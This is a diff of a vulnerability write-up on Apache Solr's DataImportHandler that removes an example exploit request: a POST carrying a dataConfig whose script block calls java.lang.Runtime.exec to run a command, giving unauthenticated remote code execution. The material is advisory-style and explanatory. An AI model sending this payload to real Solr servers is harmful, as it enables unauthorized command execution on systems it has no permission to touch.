@@ -15,30 +15,6 @@ malicious `dataConfig` containing a JavaScript snippet that is executed
 server-side by the Java scripting engine. This achieves unauthenticated remote
 code execution as the Solr process user.
 
-Example exploit request:
-```
-POST /solr/testcore/dataimport?command=full-import&verbose=false&clean=false&commit=true
-Content-Type: application/x-www-form-urlencoded
-
-dataConfig=<dataConfig>
-  <dataSource type="URLDataSource"/>
-  <script><![CDATA[
-    function poc(row) {
-      var runtime = java.lang.Runtime.getRuntime();
-      var proc = runtime.exec("id");
-      ...
-      return row;
-    }
-  ]]></script>
-  <document>
-    <entity name="e" url="http://localhost/"
-            processor="XPathEntityProcessor"
-            forEach="/html"
-            transformer="script:poc"/>
-  </document>
-</dataConfig>
-```
-
 No authentication is required in the default Solr configuration.
 
 ## Affected Service
